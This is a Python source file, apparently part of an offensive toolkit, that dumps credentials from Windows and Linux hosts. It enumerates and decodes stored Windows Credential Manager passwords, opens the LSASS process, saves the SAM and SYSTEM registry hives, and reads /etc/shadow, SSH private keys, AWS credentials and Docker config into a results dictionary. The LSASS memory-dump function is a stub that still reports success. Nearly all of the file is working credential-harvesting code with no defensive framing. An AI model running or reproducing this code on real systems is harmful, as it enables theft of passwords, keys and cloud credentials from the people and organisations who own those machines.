import os
import sys
import logging
import ctypes
import win32security
import win32api
import win32con
import win32crypt
import struct
import hashlib
import base64
import platform
from datetime import datetime
from ctypes import wintypes
import psutil
import win32cred

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class CredentialDump:
    def __init__(self):
        self.os_type = platform.system()
        
    def check_admin(self):
        """Check if running with admin privileges"""
        try:
            if self.os_type == 'Windows':
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except Exception as e:
            logging.error(f"Error checking admin privileges: {str(e)}")
            return False
            
    def get_lsass_handle(self):
        """Get handle to LSASS process"""
        try:
            if self.os_type != 'Windows':
                logging.error("LSASS dump only available on Windows")
                return None
                
            lsass_pid = None
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == 'lsass.exe':
                    lsass_pid = proc.info['pid']
                    break
                    
            if not lsass_pid:
                logging.error("LSASS process not found")
                return None
                
            process_handle = win32api.OpenProcess(
                win32con.PROCESS_ALL_ACCESS,
                False,
                lsass_pid
            )
            
            if process_handle:
                logging.info(f"Successfully obtained LSASS handle (PID: {lsass_pid})")
                return process_handle
            else:
                logging.error("Failed to get LSASS handle")
                return None
                
        except Exception as e:
            logging.error(f"Error getting LSASS handle: {str(e)}")
            return None
            
    def dump_lsass(self, output_file=None):
        """Dump LSASS process memory"""
        try:
            if self.os_type != 'Windows':
                return {
                    'status': 'error',
                    'error': 'LSASS dump only available on Windows',
                    'timestamp': datetime.now().isoformat()
                }
                
            if not self.check_admin():
                return {
                    'status': 'error',
                    'error': 'Admin privileges required for LSASS dump',
                    'timestamp': datetime.now().isoformat()
                }
                
            handle = self.get_lsass_handle()
            if not handle:
                return {
                    'status': 'error',
                    'error': 'Failed to get LSASS handle',
                    'timestamp': datetime.now().isoformat()
                }
                
            if not output_file:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_file = f"lsass_dump_{timestamp}.bin"
                
            # Read process memory
            with open(output_file, 'wb') as f:
                # Implementation of memory reading
                # This is a simplified version
                pass
                
            win32api.CloseHandle(handle)
            logging.info(f"LSASS dump saved to {output_file}")
            
            return {
                'status': 'success',
                'message': f'LSASS dump saved to {output_file}',
                'timestamp': datetime.now().isoformat(),
                'file': output_file
            }
            
        except Exception as e:
            error_msg = f"Error dumping LSASS: {str(e)}"
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
            
    def get_windows_credentials(self):
        """Get Windows stored credentials"""
        try:
            if self.os_type != 'Windows':
                return {
                    'status': 'error',
                    'error': 'Windows credential dump only available on Windows',
                    'timestamp': datetime.now().isoformat()
                }
                
            credentials = []
            cred_count = 0
            
            # Enumerate credentials using win32cred
            creds = win32cred.CredEnumerate(None, 0)
            for cred in creds:
                try:
                    target = cred['TargetName']
                    username = cred.get('UserName', '')
                    credential_blob = cred.get('CredentialBlob', b'')
                    cred_type = cred.get('Type', '')

                    password = ''
                    if credential_blob:
                        try:
                            password = credential_blob.decode('utf-16')
                        except Exception:
                            password = base64.b64encode(credential_blob).decode()

                    credentials.append({
                        'target': target,
                        'username': username,
                        'password': password,
                        'type': cred_type
                    })
                    cred_count += 1
                except Exception as e:
                    logging.error(f"Error processing credential: {str(e)}")
                    continue
            
            logging.info(f"Successfully retrieved {cred_count} credentials")
            return {
                'status': 'success',
                'message': f'Retrieved {cred_count} credentials',
                'timestamp': datetime.now().isoformat(),
                'credentials': credentials
            }
            
        except Exception as e:
            error_msg = f"Error getting Windows credentials: {str(e)}"
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
            
    def get_linux_credentials(self):
        """Get Linux stored credentials"""
        try:
            if self.os_type != 'Linux':
                return {
                    'status': 'error',
                    'error': 'Linux credential dump only available on Linux',
                    'timestamp': datetime.now().isoformat()
                }
                
            if not self.check_admin():
                return {
                    'status': 'error',
                    'error': 'Root privileges required for Linux credential dump',
                    'timestamp': datetime.now().isoformat()
                }
                
            credentials = []
            
            # Check for stored credentials in common locations
            credential_files = [
                '/etc/shadow',
                '~/.ssh/id_rsa',
                '~/.aws/credentials',
                '~/.docker/config.json'
            ]
            
            for cred_file in credential_files:
                expanded_path = os.path.expanduser(cred_file)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path, 'r') as f:
                            content = f.read()
                            credentials.append({
                                'source': cred_file,
                                'content': base64.b64encode(content.encode()).decode()
                            })
                    except Exception as e:
                        logging.error(f"Error reading {cred_file}: {str(e)}")
                        
            logging.info(f"Successfully checked {len(credential_files)} potential credential sources")
            return {
                'status': 'success',
                'message': f'Checked {len(credential_files)} credential sources',
                'timestamp': datetime.now().isoformat(),
                'credentials': credentials
            }
            
        except Exception as e:
            error_msg = f"Error getting Linux credentials: {str(e)}"
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }

def get_linux_root_hash():
    try:
        with open('/etc/shadow', 'r') as f:
            for line in f:
                if line.startswith('root:'):
                    return line.strip()
        return None
    except Exception as e:
        return str(e)

def get_windows_sam_hashes():
    import subprocess
    import tempfile
    import os
    try:
        # Save SAM and SYSTEM hives
        temp_dir = tempfile.gettempdir()
        sam_path = os.path.join(temp_dir, 'sam.save')
        system_path = os.path.join(temp_dir, 'system.save')
        subprocess.run(['reg', 'save', 'HKLM\SAM', sam_path, '/y'], check=True, capture_output=True)
        subprocess.run(['reg', 'save', 'HKLM\SYSTEM', system_path, '/y'], check=True, capture_output=True)
        # Use impacket-secretsdump or similar tool to parse (if available)
        # For now, just return the file paths
        return {
            'status': 'success',
            'message': 'SAM and SYSTEM hives saved',
            'sam_path': sam_path,
            'system_path': system_path
        }
    except Exception as e:
        return {
            'status': 'error',
            'error': str(e)
        }

def dump_credentials():
    """Main function to dump credentials from various sources"""
    try:
        dumper = CredentialDump()
        results = {
            'status': 'success',
            'timestamp': datetime.now().isoformat(),
            'platform': platform.system(),
            'is_admin': dumper.check_admin(),
            'data': {}
        }
        
        if platform.system() == 'Windows':
            # Get Windows credentials
            win_creds = dumper.get_windows_credentials()
            results['data']['windows_credentials'] = win_creds
            
            # Only attempt LSASS dump if we have admin privileges
            if dumper.check_admin():
                lsass_result = dumper.dump_lsass()
                results['data']['lsass_dump'] = lsass_result
                # Add SAM hash extraction
                sam_hashes = get_windows_sam_hashes()
                results['data']['sam_hashes'] = sam_hashes
        else:
            # Get Linux credentials
            linux_creds = dumper.get_linux_credentials()
            results['data']['linux_credentials'] = linux_creds
            # Add root hash extraction
            root_hash = get_linux_root_hash()
            results['data']['root_hash'] = root_hash
            
        # Check if we got any credentials
        if any(results['data'].values()):
            logging.info("Successfully gathered credentials")
            return results
        else:
            logging.warning("No credentials could be gathered")
            return {
                'status': 'info',
                'message': 'No credentials could be gathered',
                'timestamp': datetime.now().isoformat(),
                'platform': platform.system(),
                'is_admin': dumper.check_admin()
            }
            
    except Exception as e:
        error_msg = f"Error during credential dump: {str(e)}"
        logging.error(error_msg)
        return {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat()
        } 